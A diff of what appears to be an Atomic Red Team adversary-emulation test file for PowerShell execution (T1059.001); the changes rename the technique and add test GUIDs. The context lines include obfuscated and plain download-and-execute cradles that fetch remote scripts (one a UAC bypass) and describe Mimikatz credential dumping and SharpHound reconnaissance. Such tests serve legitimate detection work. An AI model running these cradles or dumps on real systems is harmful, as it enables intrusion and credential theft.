@@ -1,8 +1,8 @@
-attack_technique:
-- T1059.001
-display_name: PowerShell
+attack_technique: T1059.001
+display_name: 'Command and Scripting Interpreter: PowerShell'
 atomic_tests:
 - name: Mimikatz
+  auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
   description: |
     Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
   supported_platforms:
@@ -18,6 +18,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
 - name: Run BloodHound from local disk
+  auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
   description: |
     Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
 
@@ -28,7 +29,7 @@ atomic_tests:
     file_path:
       description: File path for SharpHound payload
       type: String
-      default: PathToAtomicsFolder\T1086\src
+      default: PathToAtomicsFolder\T1059.001\src
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -48,6 +49,7 @@ atomic_tests:
       Remove-Item $env:Temp\*BloodHound.zip -Force
     name: powershell
 - name: Run Bloodhound from Memory using Download Cradle
+  auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
   description: |
     Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.
 
@@ -64,6 +66,7 @@ atomic_tests:
       Remove-Item $env:Temp\*BloodHound.zip -Force
     name: powershell
 - name: Obfuscation Tests
+  auto_generated_guid: 4297c41a-8168-4138-972d-01f3ee92c804
   description: |
     Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
   supported_platforms:
@@ -75,6 +78,7 @@ atomic_tests:
       Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
     name: powershell
 - name: Mimikatz - Cradlecraft PsSendKeys
+  auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
   description: |
     Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.
   supported_platforms:
@@ -85,6 +89,7 @@ atomic_tests:
     name: powershell
     elevation_required: true
 - name: Invoke-AppPathBypass
+  auto_generated_guid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
   description: |
     Note: Windows 10 only. Upon execution windows backup and restore window will be opened.
 
@@ -96,6 +101,7 @@ atomic_tests:
       Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
     name: command_prompt
 - name: Powershell MsXml COM object - with prompt
+  auto_generated_guid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
   description: |
     Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
 
@@ -112,6 +118,7 @@ atomic_tests:
       powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
     name: command_prompt
 - name: Powershell XML requests
+  auto_generated_guid: 4396927f-e503-427b-b023-31049b9b09a6
   description: |
     Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.
 
@@ -128,6 +135,7 @@ atomic_tests:
       "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
     name: command_prompt
 - name: Powershell invoke mshta.exe download
+  auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
   description: |
     Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".
 
@@ -144,6 +152,7 @@ atomic_tests:
       C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
     name: command_prompt
 - name: Powershell Invoke-DownloadCradle
+  auto_generated_guid: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7
   description: |
     Provided by https://github.com/mgreen27/mgreen27.github.io
     Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
@@ -155,6 +164,7 @@ atomic_tests:
       2. Invoke-DownloadCradle.ps1
     name: manual
 - name: PowerShell Fileless Script Execution
+  auto_generated_guid: fa050f5e-bc75-4230-af73-b6fd7852cd73
   description: |
     Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
     art-marker.txt is in the folder.
@@ -171,6 +181,7 @@ atomic_tests:
     name: powershell
     elevation_required: true
 - name: PowerShell Downgrade Attack
+  auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
   description: |
     This test requires the manual installation of PowerShell V2.
 
@@ -189,6 +200,7 @@ atomic_tests:
       powershell.exe -version 2 -Command Write-Host $PSVersion
     name: powershell
 - name: NTFS Alternate Data Stream Access
+  auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
   description: |
     Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.
   supported_platforms:
